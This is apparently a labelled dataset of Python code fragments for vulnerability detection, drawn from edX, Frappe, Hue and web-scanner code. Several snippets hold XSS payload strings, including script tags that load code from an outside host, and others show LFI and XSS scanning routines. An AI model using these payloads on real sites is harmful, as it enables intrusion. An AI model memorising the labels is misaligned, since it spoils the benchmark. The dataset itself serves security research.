self.testsonly=kwargs.get('testsonly', False", "label": 0}, {"snippet_id": 37461, "code": " \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context", "label": 1}, {"snippet_id": 15736, "code": " def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir", "label": 0}, {"snippet_id": 45882, "code": "=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,),", "label": 0}, {"snippet_id": 23448, "code": ": urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name", "label": 0}, {"snippet_id": 3620, "code": " vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are", "label": 0}, {"snippet_id": 27860, "code": " handle_exception_exception(self): \"\"\"Catch exception in handle_exception and format it properly.\"\"\" exception=sys.exc_info()[1] values={'message': exception.message, 'traceDump': traceback.format_exc(", "label": 0}, {"snippet_id": 20883, "code": "), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware", "label": 0}, {"snippet_id": 4662, "code": " 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete", "label": 0}, {"snippet_id": 17042, "code": "[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 27001, "code": " global lfi_attacks global lfi_expect global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0: furl=page else: if _url.find(\"https://\")==0: furl=\"https://\" +host +\"/\" +page else: furl=\"http:/", "label": 0}, {"snippet_id": 39705, "code": ") \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t", "label": 0}, {"snippet_id": 47961, "code": " import HttpRequest, HttpResponseBadRequest from frontpage.models import Profile, Media, MediaUpload from frontpage.management.magic import compile_markdown, get_current_user import logging import ntpath", "label": 0}, {"snippet_id": 1443, "code": " print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>", "label": 0}, {"snippet_id": 16449, "code": " continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key", "label": 0}, {"snippet_id": 48671, "code": "]) if(r.createdByUser==u or o.rights > 1) and not r.submitted: r.save() else: return HttpResponseRedirect(\"/admin?error=noyb\") response: HttpResponseRedirect=HttpResponseRedirect(forward_url +\"?rid=\" +str", "label": 1}, {"snippet_id": 22126, "code": " import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin", "label": 0}, {"snippet_id": 17446, "code": "/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings", "label": 0}, {"snippet_id": 21108, "code": "*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch", "label": 0}, {"snippet_id": 19756, "code": "-directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e", "label": 0}, {"snippet_id": 16387, "code": "'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template'", "label": 0}, {"snippet_id": 19937, "code": ", None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p", "label": 0}, {"snippet_id": 22230, "code": "'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error", "label": 0}, {"snippet_id": 53316, "code": ", ex)) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')] return render('editor/list_editor_bundles.mako', request", "label": 0}, {"snippet_id": 2902, "code": " result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,", "label": 0}, {"snippet_id": 28042, "code": "=SESSION_EXPIRY_DAYS) try: session_cookie=auth.create_session_cookie(id_token, expires_in) except auth.AuthError: raise helpers.EarlyExitException('Failed to create session cookie.', 401) expires=datetime.datetime.now(", "label": 0}, {"snippet_id": 29037, "code": " proxy is not None else \"\" \t\t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+", "label": 0}, {"snippet_id": 4968, "code": "<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme", "label": 0}, {"snippet_id": 15686, "code": ".default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit..", "label": 0}, {"snippet_id": 38744, "code": " \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t", "label": 0}, {"snippet_id": 16568, "code": "'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 46107, "code": " is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': json.dumps(query), 'initial': json.dumps({ 'collections':[], 'layout': DEFAULT_LAYOUT, 'is_latest", "label": 0}, {"snippet_id": 13705, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', ", "label": 1}, {"snippet_id": 21026, "code": ".lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED:", "label": 0}, {"snippet_id": 13988, "code": "]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading", "label": 0}, {"snippet_id": 15552, "code": "\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected ", "label": 0}, {"snippet_id": 33271, "code": ", task_id) class UnregisterBuilders(webapp2.RequestHandler): \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\" @decorators.require_cronjob def get(self): service.unregister_builders()", "label": 0}, {"snippet_id": 7922, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P", "label": 0}, {"snippet_id": 33797, "code": " frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t", "label": 1}, {"snippet_id": 45064, "code": ", jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with url' in str(detail): detail='%s: %s' %(_('The", "label": 0}, {"snippet_id": 35583, "code": "\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags", "label": 0}, {"snippet_id": 40617, "code": "\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"", "label": 0}, {"snippet_id": 3567, "code": "(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id", "label": 0}, {"snippet_id": 23115, "code": "/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',", "label": 0}, {"snippet_id": 25553, "code": " additional questions defined by the organizer. \"\"\" def __init__(self, *args, **kwargs): \"\"\" Takes two additional keyword arguments: :param cartpos: The cart position the form should be for :param event", "label": 0}, {"snippet_id": 37925, "code": " Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): ", "label": 0}, {"snippet_id": 18589, "code": ".list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(", "label": 0}, {"snippet_id": 4984, "code": "/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir", "label": 0}, {"snippet_id": 38426, "code": "\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post", "label": 0}, {"snippet_id": 17117, "code": ".remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 9025, "code": "'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/", "label": 0}, {"snippet_id": 24534, "code": " bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers(", "label": 0}, {"snippet_id": 33253, "code": " TaskCancelSwarmingTask(webapp2.RequestHandler): \"\"\"Cancels a swarming task.\"\"\" @decorators.require_taskqueue('backend-default') def post(self, host, task_id): swarming.cancel_task(host, task_id) class UnregisterBuilders", "label": 0}, {"snippet_id": 374, "code": " xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G,", "label": 1}, {"snippet_id": 39772, "code": " \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value", "label": 0}, {"snippet_id": 54188, "code": "\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light sky blue').grid(row=3) Label(main, text=\"User-Agent:\",background='light sky blue').grid(row=4) Label(main, text=", "label": 0}, {"snippet_id": 24366, "code": "-modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors", "label": 0}, {"snippet_id": 7513, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name", "label": 0}, {"snippet_id": 21100, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)", "label": 0}, {"snippet_id": 7698, "code": ".html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/", "label": 1}, {"snippet_id": 41458, "code": " ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t", "label": 0}, {"snippet_id": 33425, "code": " True: \t\t\t_payload=generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url,", "label": 1}, {"snippet_id": 19441, "code": " means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit", "label": 0}, {"snippet_id": 17751, "code": "(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper", "label": 0}, {"snippet_id": 2872, "code": ": db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET", "label": 0}, {"snippet_id": 18403, "code": "<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 49169, "code": "'-{}.{}'.format(self.column_id, \".\".join(new_query)) }) else: return self.get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format(self.column_id, \".\".join(new_query)) }) else: return self", "label": 0}, {"snippet_id": 36465, "code": " _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\"", "label": 0}, {"snippet_id": 41396, "code": " \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1", "label": 0}, {"snippet_id": 43117, "code": "\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date", "label": 0}, {"snippet_id": 23435, "code": "/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth", "label": 0}, {"snippet_id": 38949, "code": ".parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 ", "label": 0}, {"snippet_id": 44699, "code": ".username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': ", "label": 0}, {"snippet_id": 6603, "code": ", path)) self._parsed_content_packages=res return res @property def verify_request_signatures(self): \"\"\" Verify request signatures, if they exist. This defaults to False since it is a trivial DoS to consume", "label": 0}, {"snippet_id": 32667, "code": " md=markdown.Markdown(extensions=extensions, extension_configs=extension_configs, tab_length=2, output_format='html4') has_a_single_h1=(len([line for line in contents.splitlines() if(line.startswith(' not", "label": 0}, {"snippet_id": 33279, "code": ".\"\"\" @decorators.require_cronjob def get(self): service.unregister_builders() def get_frontend_routes(): endpoints_services=[ legacy_api.BuildBucketApi, config_api.ConfigApi, swarmbucket_api.SwarmbucketApi", "label": 0}, {"snippet_id": 19547, "code": " TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self):", "label": 0}, {"snippet_id": 18168, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name", "label": 0}, {"snippet_id": 8445, "code": " from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings", "label": 0}, {"snippet_id": 16057, "code": " urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"", "label": 0}, {"snippet_id": 25224, "code": ") class NamePartsWidget(forms.MultiWidget): widget=forms.TextInput def __init__(self, scheme: dict, field: forms.Field, attrs=None): widgets=[] self.scheme=scheme self.field=field for fname, label, size", "label": 0}, {"snippet_id": 9832, "code": ".test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/", "label": 0}, {"snippet_id": 27400, "code": "'): return obj.to_dict() elif isinstance(obj, cgi.FieldStorage): return str(obj) else: raise Exception('Cannot serialise %s' % obj) def format_time(dt): \"\"\"Format datetime object for display.\"\"\" return", "label": 0}, {"snippet_id": 39264, "code": " frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df", "label": 0}, {"snippet_id": 52694, "code": " except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads", "label": 0}, {"snippet_id": 32993, "code": "(path, encoding='utf-8') as fp: return fp.read() def _WriteHeader(self, content_type='text/plain', status_code=200): self.send_response(status_code) self.send_header('Content-Type', content_type) self.end_headers", "label": 0}, {"snippet_id": 13045, "code": " url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\")", "label": 0}, {"snippet_id": 30459, "code": " %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(local_path_logs, date, date1, rows, grep_act, grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail", "label": 0}, {"snippet_id": 14370, "code": "(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth", "label": 0}, {"snippet_id": 33786, "code": "\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title", "label": 1}, {"snippet_id": 30286, "code": "=requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass)) \t if serv is not None and act==\"stats\": \timport requests \tfrom requests_toolbelt", "label": 0}, {"snippet_id": 11027, "code": ".generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers", "label": 0}, {"snippet_id": 21295, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>", "label": 1}, {"snippet_id": 40937, "code": " import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import", "label": 1}, {"snippet_id": 54572, "code": "'form']=CommentForm() return context class RegisterFormView(FormView): \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\" template_name='register.html' form_class=UserCreationForm success_url='/login/' def form_valid(self, form):", "label": 0}, {"snippet_id": 8051, "code": "/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +", "label": 0}, {"snippet_id": 15645, "code": ": sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data", "label": 0}, {"snippet_id": 37121, "code": ", %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post", "label": 0}, {"snippet_id": 33955, "code": "\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name", "label": 0}, {"snippet_id": 12726, "code": "): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),", "label": 0}, {"snippet_id": 39793, "code": "\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t", "label": 0}, {"snippet_id": 27132, "code": ", form_counter, url) check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re", "label": 1}, {"snippet_id": 33483, "code": " import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import", "label": 1}, {"snippet_id": 50046, "code": " def jsonify(obj): return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder)) class AjaxWebClient(resource.Resource): \"\"\" An ajax/comet long-polling transport \"\"\" isLeaf=True allowedMethods", "label": 0}, {"snippet_id": 26047, "code": "('all_optional', False) super().__init__(*args, **kwargs) if not event.settings.invoice_address_vatid: del self.fields['vat_id'] if not event.settings.invoice_address_required or self.all_optional: for", "label": 0}, {"snippet_id": 20547, "code": ".format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler", "label": 0}, {"snippet_id": 22908, "code": ">[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>", "label": 1}, {"snippet_id": 15304, "code": "') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs", "label": 0}, {"snippet_id": 20918, "code": "\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view", "label": 0}, {"snippet_id": 25257, "code": " widgets.append(self.widget(attrs=a)) super().__init__(widgets, attrs) def decompress(self, value): if value is None: return None data=[] for i, field in enumerate(self.scheme['fields']): fname, label,", "label": 0}, {"snippet_id": 36205, "code": " \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated", "label": 0}, {"snippet_id": 41473, "code": "\"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post", "label": 0}, {"snippet_id": 10386, "code": " various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\"", "label": 0}, {"snippet_id": 11392, "code": " github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh(", "label": 0}, {"snippet_id": 29740, "code": " \t\treturn ret \t\t def get_files(dir=get_config_var('configs', 'haproxy_save_configs_dir'), format='cfg', **kwargs): \timport glob \tfile=set() \treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir", "label": 0}, {"snippet_id": 22158, "code": " url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user", "label": 0}, {"snippet_id": 17270, "code": ".get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth", "label": 0}, {"snippet_id": 24667, "code": ".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh", "label": 0}, {"snippet_id": 22736, "code": ".views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$", "label": 0}, {"snippet_id": 25422, "code": ", None), } self.scheme_name=kwargs.pop('scheme') self.scheme=PERSON_NAME_SCHEMES.get(self.scheme_name) self.one_required=kwargs.get('required', True) 